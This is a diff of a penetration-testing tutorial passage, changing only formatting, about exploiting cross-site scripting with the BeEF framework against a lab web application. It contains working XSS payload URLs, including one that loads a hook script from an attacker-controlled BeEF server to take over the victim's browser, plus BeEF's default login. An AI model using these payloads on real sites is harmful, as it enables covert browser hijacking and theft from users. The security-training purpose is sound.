@@ -175,19 +175,19 @@ Burp Suite excels in scenarios involving complex application workflows or multi-
 The BeEF (Browser Exploitation Framework) is an exceptional tool for leveraging XSS (Cross-Site Scripting) attacks. With BeEF, if you identify a valid XSS vulnerability, you can not only capture the victim's browser session but also perform actions like stealing clipboard content, redirecting the user, activating their webcam, and much more. To make use of BeEF with an XSS vulnerability, you need to craft your XSS payload to interact with the BeEF Framework.
 
 For our example, we'll use an XSS vulnerability discovered through Burp Suite’s Active Scans. Consider the following vulnerable URL:
-http://www.securepla.net/xss_example/example.php?alert=test'<script>[iframe]</script>
+```http://www.securepla.net/xss_example/example.php?alert=test'<script>[iframe]</script>```
 
-Firstly, ensure the BeEF service is running. Once BeEF is up and running, log into the BeEF web interface at http://127.0.0.1:3000/ui/authentication. If everything is set up correctly, you should be able to log in using the default credentials: username “beef” and password “beef”.
+Firstly, ensure the BeEF service is running. Once BeEF is up and running, log into the BeEF web interface at ```http://127.0.0.1:3000/ui/authentication```. If everything is set up correctly, you should be able to log in using the default credentials: username “beef” and password “beef”.
 
 In the terminal where BeEF was launched, you'll find URLs for both the web interface and the hook page (Hook URL). The hook page, which is a JavaScript file, contains the payload that will control the victim's browser once injected. This script is designed to connect the victim’s browser back to your central BeEF server without their knowledge.
 
 After identifying an XSS vulnerability using tools like Burp Suite or ZAP on a Web Application VM (OWASP BWA), you can exploit it directly. For example:
-http://[IP_of_OWASPBWA]/owaspbricks/content-2/index.php?user=harry3a201<script>alert(1)<%2fscript>6f350
+```http://[IP_of_OWASPBWA]/owaspbricks/content-2/index.php?user=harry3a201<script>alert(1)<%2fscript>6f350```
 
 This URL shows that the user parameter on the vulnerable page processes and displays JavaScript code. This confirms that the XSS vulnerability can execute JavaScript within the context of the victim’s browser.
 
 To create a successful exploit, you can use JavaScript to include the hook.js file from your BeEF server. For instance, you might craft a URL like:
-http://192.168.1.124/owaspbricks/content-2/index.php?user=harry3a201<script src=http://192.168.1.123:3000/hook.js></script>
+```http://192.168.1.124/owaspbricks/content-2/index.php?user=harry3a201<script src=http://192.168.1.123:3000/hook.js></script>```
 
 This URL injects the hook.js script into the vulnerable page, allowing BeEF to control the victim’s browser.
 
